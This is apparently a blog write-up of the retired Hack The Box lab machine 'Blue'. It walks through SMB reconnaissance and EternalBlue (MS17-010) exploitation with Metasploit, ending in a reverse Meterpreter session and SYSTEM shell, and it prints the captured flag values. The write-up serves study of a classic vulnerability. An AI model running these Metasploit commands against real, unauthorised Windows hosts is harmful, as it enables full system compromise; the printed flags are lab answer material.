---
title: "Blue (HTB) — Walkthrough"
date: 2025-09-17
tags: ["htb","windows","smb","ms17-010","privesc"]
series: ["Hack The Box — retired"]
difficulty: "Easy"
platform: "Hack The Box"
summary: "Exploiting MS17-010 (EternalBlue) on a Windows 7 SP1 target. Recon, SMB enumeration, exploitation, and proof of SYSTEM access."
---

> ⚠️ **Spoiler warning**: This covers a retired HTB machine. IPs and hostnames are redacted. This writeup documents my playthrough of the retired Hack The Box machine **Blue**. 

The VPN IPs shown below are the HTB-assigned VPN addresses used during the box (left intact here for reproducibility). Do not attempt this on non-authorised or active systems.

# Blue (HTB) — Walkthrough

## Overview
- **Platform:** Hack The Box (retired)  
- **Target OS:** Windows 7 Professional SP1  
- **Focus:** SMB enumeration → EternalBlue (MS17-010) → SYSTEM shell  
- **Difficulty:** Easy

---

## Recon

Initial scan:

```bash
nmap -sV -sC -oN scans/blue-initial 10.129.242.117
```
**Result highlights (relevant line)**

445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1
A full scan confirmed SMB was exposed and appeared to be running SMBv1.
![Nmap ports output showing SMB 445 open](/images/blue/nmap.png)


---

## SMB Enumeration

**Anonymous enumeration with enum4linux**

```bash
enum4linux -a 10.129.242.117
```
![enum4linux for SMB enumeration](/images/blue/smb_enumeration.png)

![enum4linux interesting output](/images/blue/smb_enumeration.png)

**Anonymous SMB session also succeeded**

```bash
smbclient -L //10.129.242.117/ -N
```

Shares observed:

ADMIN$    C$    IPC$    Share    Users

Given Windows 7 + SMBv1 exposure, EternalBlue (MS17-010) looked likely.
![SMB shares](/images/blue/smb_shares.png)

---

## Exploitation (MS17-010 / EternalBlue)

Check target with Metasploit's SMB version scanner:

```msfconsole
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.129.242.117
msf6 auxiliary(scanner/smb/smb_version) > run
```
**Confirmed vulnerable** 

[+] 10.129.242.117:445 - Host is running Windows 7 Professional SP1
![Metasploit auxiliary module - SMB scanner](/images/blue/metasploit_scanner.png)


**Host is likely VULNERABLE to MS17-010!**

---

## Launch the exploit:

```msfconsole
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.242.117
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```
![Metasploit exploit module - ms17_010_eternalblue](/images/blue/metasploit_exploit.png)


**Success:**

[+] Meterpreter session 1 opened
![Meterpreter session to shell](/images/blue/meterpreter_shell.png)


---

## Privilege Escalation

Drop into an interactive shell from Meterpreter:

```meterpreter
meterpreter > shell
```
```interactive shell
C:\Windows\system32> whoami
```
**Result:**

nt authority\system
The exploit provided full SYSTEM privileges.

**User flag:**

```interactive shell
C:\Users\haris\Desktop> type user.txt
```
"1b3265edfce880834b5e8e8fc8ac5a18"
![User flag found](/images/blue/user-flag.png)

**Root flag:**

```interactive shell
C:\Users\Administrator\Desktop> type root.txt
```
"76a957ccd469d05e2883b49b77079847"
![Root flag found](/images/blue/root-flag.png)

---

## Takeaways

Always check SMB version — legacy SMBv1 is a red flag.

EternalBlue is a classic exploit; patched since 2017, but still useful to study.

Metasploit automates exploitation, but understanding the underlying vulnerability (buffer overflow in SMBv1) is important.

Enumeration (enum4linux, smbclient) confirmed access, but exploitation was the real path in this box.

---

## Resources

MS17-010 (Microsoft Security Bulletin).

Hack The Box — retired machines archive.

My GitHub repo (basil9099.github.io) with scans/notes.

